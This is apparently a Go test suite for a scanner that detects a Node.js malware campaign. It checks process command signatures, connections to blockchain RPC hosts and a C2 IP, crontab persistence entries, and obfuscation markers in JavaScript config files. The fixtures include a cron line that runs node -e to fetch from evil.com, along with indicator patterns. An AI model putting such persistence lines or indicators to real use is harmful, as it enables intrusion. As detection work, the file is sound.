package main

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

func TestMatchProcessCmd(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		reason  string
		matched bool
	}{
		{
			name:    "global access eval",
			cmd:     `node -e global["!"] something`,
			reason:  "node eval with global[] access",
			matched: true,
		},
		{
			name:    "global bracket variant",
			cmd:     `node -e 'var x=global["payload"]'`,
			reason:  "node eval with global[] access",
			matched: true,
		},
		{
			name:    "V equals -22 signature",
			cmd:     `node app.js _V something =-22 payload`,
			reason:  "node with _V=-22 signature",
			matched: true,
		},
		{
			name:    "Gez call",
			cmd:     `node server.js Gez(encoded_data)`,
			reason:  "node with Gez() call",
			matched: true,
		},
		{
			name:    "legitimate node app",
			cmd:     `node /usr/local/bin/serve`,
			matched: false,
		},
		{
			name:    "node with -e but no global",
			cmd:     `node -e "console.log('hello')"`,
			matched: false,
		},
		{
			name:    "empty command",
			cmd:     "",
			matched: false,
		},
		{
			name:    "global without -e flag",
			cmd:     `node app.js global["test"]`,
			matched: false,
		},
		{
			name:    "_V without =-22",
			cmd:     `node _V_module.js`,
			matched: false,
		},
		{
			name:    "Gez without parens",
			cmd:     `node Gez_module.js`,
			matched: false,
		},
		{
			name:    "case sensitive Gez",
			cmd:     `node server.js gez(data)`,
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason, matched := matchProcessCmd(tt.cmd)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && reason != tt.reason {
				t.Errorf("reason = %q, want %q", reason, tt.reason)
			}
		})
	}
}

func TestMatchNetworkLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		host    string
		matched bool
	}{
		{
			name:    "trongrid connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "aptoslabs connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->aptoslabs.com:443 (ESTABLISHED)",
			host:    "aptoslabs",
			matched: true,
		},
		{
			name:    "bsc-dataseed connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->bsc-dataseed.binance.org:443 (ESTABLISHED)",
			host:    "bsc-dataseed",
			matched: true,
		},
		{
			name:    "publicnode connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->publicnode.com:443 (ESTABLISHED)",
			host:    "publicnode",
			matched: true,
		},
		{
			name:    "direct IP C2",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->136.0.9.8:8080 (ESTABLISHED)",
			host:    "136.0.9.8",
			matched: true,
		},
		{
			name:    "case insensitive trongrid",
			line:    "Node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->TRONGRID.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "legitimate node connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->google.com:443 (ESTABLISHED)",
			matched: false,
		},
		{
			name:    "non-node process to C2",
			line:    "Safari    12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			matched: false,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			host, matched := matchNetworkLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && host != tt.host {
				t.Errorf("host = %q, want %q", host, tt.host)
			}
		})
	}
}

func TestMatchPersistenceLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		keyword string
		matched bool
	}{
		{
			name:    "node eval in crontab",
			line:    "*/5 * * * * node -e 'require(\"http\").get(\"http://evil.com\")'",
			keyword: "node -e",
			matched: true,
		},
		{
			name:    "trongrid reference",
			line:    "0 * * * * curl https://trongrid.io/api",
			keyword: "trongrid",
			matched: true,
		},
		{
			name:    "binance reference",
			line:    "*/10 * * * * node check-binance.js",
			keyword: "binance",
			matched: true,
		},
		{
			name:    "legitimate cron job",
			line:    "0 2 * * * /usr/local/bin/backup.sh",
			matched: false,
		},
		{
			name:    "node without -e",
			line:    "*/5 * * * * node /app/server.js",
			matched: false,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			keyword, matched := matchPersistenceLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && keyword != tt.keyword {
				t.Errorf("keyword = %q, want %q", keyword, tt.keyword)
			}
		})
	}
}

func TestMatchConfigContent(t *testing.T) {
	tests := []struct {
		name    string
		content string
		marker  string
		matched bool
	}{
		{
			name:    "global bang marker",
			content: `module.exports = { webpack: (config) => { global["!"] = true; return config; } }`,
			marker:  `global["!"]`,
			matched: true,
		},
		{
			name:    "c266 obfuscation marker",
			content: `const _$_c266 = ["\\x68\\x74\\x74\\x70"];`,
			marker:  "_$_c266",
			matched: true,
		},
		{
			name:    "fromCharCode marker",
			content: `var s = String.fromCharCode(127) + payload;`,
			marker:  "fromCharCode(127)",
			matched: true,
		},
		{
			name:    "clean config",
			content: `module.exports = { reactStrictMode: true }`,
			matched: false,
		},
		{
			name:    "empty content",
			content: "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			marker, matched := matchConfigContent(tt.content)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && marker != tt.marker {
				t.Errorf("marker = %q, want %q", marker, tt.marker)
			}
		})
	}
}

func TestParseProcessOutput(t *testing.T) {
	output := `USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
root                 1   0.0  0.1 34291712  12288   ??  Ss   Mon08AM   0:30.00 /sbin/launchd
user              1234   0.5  1.2 45678900 123456   ??  S    10:00AM   0:05.00 node -e global["!"] something malicious
user              5678   0.1  0.5 34567890  56789   ??  S    10:01AM   0:01.00 node /usr/local/bin/legit-app
user              9012   0.3  0.8 45678901  98765   ??  S    10:02AM   0:03.00 node app.js _V something =-22 payload
user              3456   0.2  0.4 34567891  45678   ??  S    10:03AM   0:02.00 node server.js Gez(encoded)
user              7777   0.1  0.3 34567892  34567   ??  S    10:04AM   0:01.00 node active-scan --port 9847`

	hits := parseProcessOutput(output, 99999)

	if len(hits) != 3 {
		t.Fatalf("got %d hits, want 3", len(hits))
	}

	if hits[0].PID != 1234 {
		t.Errorf("hit[0].PID = %d, want 1234", hits[0].PID)
	}
	if hits[0].Reason != "node eval with global[] access" {
		t.Errorf("hit[0].Reason = %q", hits[0].Reason)
	}

	if hits[1].PID != 9012 {
		t.Errorf("hit[1].PID = %d, want 9012", hits[1].PID)
	}
	if hits[1].Reason != "node with _V=-22 signature" {
		t.Errorf("hit[1].Reason = %q", hits[1].Reason)
	}

	if hits[2].PID != 3456 {
		t.Errorf("hit[2].PID = %d, want 3456", hits[2].PID)
	}
	if hits[2].Reason != "node with Gez() call" {
		t.Errorf("hit[2].Reason = %q", hits[2].Reason)
	}
}

func TestParseProcessOutputSkipsSelf(t *testing.T) {
	output := `USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
user              1234   0.5  1.2 45678900 123456   ??  S    10:00AM   0:05.00 node -e global["!"] payload`

	hits := parseProcessOutput(output, 1234)
	if len(hits) != 0 {
		t.Errorf("should skip own PID, got %d hits", len(hits))
	}
}

func TestParseProcessOutputSkipsActiveScan(t *testing.T) {
	output := `USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
user              7777   0.1  0.3 34567892  34567   ??  S    10:04AM   0:01.00 node active-scan --port 9847`

	hits := parseProcessOutput(output, 99999)
	if len(hits) != 0 {
		t.Errorf("should skip active-scan processes, got %d hits", len(hits))
	}
}

func TestParseProcessOutputEmpty(t *testing.T) {
	hits := parseProcessOutput("", 1)
	if len(hits) != 0 {
		t.Errorf("empty input should return nil, got %d hits", len(hits))
	}
}

func TestParseNetworkOutput(t *testing.T) {
	output := `COMMAND     PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
node      12345   user   20u  IPv4 0x1234567890     0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)
node      12346   user   21u  IPv4 0x1234567891     0t0  TCP 192.168.1.5:54322->google.com:443 (ESTABLISHED)
Safari    12347   user   22u  IPv4 0x1234567892     0t0  TCP 192.168.1.5:54323->example.com:443 (ESTABLISHED)
node      12348   user   23u  IPv4 0x1234567893     0t0  TCP 192.168.1.5:54324->136.0.9.8:8080 (ESTABLISHED)`

	hits := parseNetworkOutput(output)

	if len(hits) != 2 {
		t.Fatalf("got %d hits, want 2", len(hits))
	}

	if hits[0].PID != 12345 || hits[0].Host != "trongrid" {
		t.Errorf("hit[0] = {PID:%d Host:%q}, want {PID:12345 Host:trongrid}", hits[0].PID, hits[0].Host)
	}

	if hits[1].PID != 12348 || hits[1].Host != "136.0.9.8" {
		t.Errorf("hit[1] = {PID:%d Host:%q}, want {PID:12348 Host:136.0.9.8}", hits[1].PID, hits[1].Host)
	}
}

func TestParseNetworkOutputEmpty(t *testing.T) {
	hits := parseNetworkOutput("")
	if len(hits) != 0 {
		t.Errorf("empty input should return nil, got %d hits", len(hits))
	}
}

func TestScanProcessesReturnsClean(t *testing.T) {
	ctx := context.Background()
	detections := scanProcesses(ctx)
	// On a clean system, should find no malware processes
	if len(detections) != 0 {
		t.Logf("WARNING: detected %d suspicious processes on this system", len(detections))
	}
}

func TestScanNetworkReturnsClean(t *testing.T) {
	ctx := context.Background()
	detections := scanNetwork(ctx)
	if len(detections) != 0 {
		t.Logf("WARNING: detected %d suspicious network connections on this system", len(detections))
	}
}

func TestScanConfigsWithInfectedFile(t *testing.T) {
	dir := t.TempDir()

	infected := filepath.Join(dir, "next.config.js")
	os.WriteFile(infected, []byte(`module.exports = { global["!"] = true }`), 0644)

	clean := filepath.Join(dir, "next.config.mjs")
	os.WriteFile(clean, []byte(`export default { reactStrictMode: true }`), 0644)

	// Test matchConfigContent directly since scanConfigs uses hardcoded dirs
	infectedData, _ := os.ReadFile(infected)
	marker, matched := matchConfigContent(string(infectedData))
	if !matched {
		t.Error("infected config should match")
	}
	if marker != `global["!"]` {
		t.Errorf("marker = %q, want global[\"!\"]", marker)
	}

	cleanData, _ := os.ReadFile(clean)
	_, matched = matchConfigContent(string(cleanData))
	if matched {
		t.Error("clean config should not match")
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input string
		max   int
		want  string
	}{
		{"hello", 10, "hello"},
		{"hello", 5, "hello"},
		{"hello world", 5, "hello..."},
		{"", 5, ""},
		{"ab", 1, "a..."},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.max)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.max, got, tt.want)
		}
	}
}
